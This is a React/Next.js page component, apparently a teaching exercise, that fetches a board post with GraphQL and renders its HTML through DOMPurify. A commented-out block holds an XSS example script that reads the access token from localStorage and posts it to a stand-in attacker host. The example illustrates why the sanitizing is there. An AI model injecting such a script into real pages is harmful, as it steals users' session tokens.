import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";
const FETCH_BOARD = gql`
  query fetchBoard($boardId: Id!) {
    fetchBoard(boardId: $boardId) {
      writer
      title
      contents
    }
  }
`;

export default function StaticRouringMovedPage(): JSX.Element {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.qqq },
  });

  return (
    <>
      <div>writer: {data?.fetchBoard?.writer}</div>
      <div>title: {data?.fetchBoard?.title}</div>
      {/* <div>content: {data?.fetchBoard?.content}</div> */}
      {/*  <div
        dangerouslySetInnerHTML={{
          __html: `
          <script>
            const qqq = localStorage.getItem("accessToken")
            axios.post("http://myhackerbackend.com/mydata", {data: qqq})
          </script>`,
        }} 
      /> */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard?.contents),
          }}
        />
      )}
    </>
  );
}
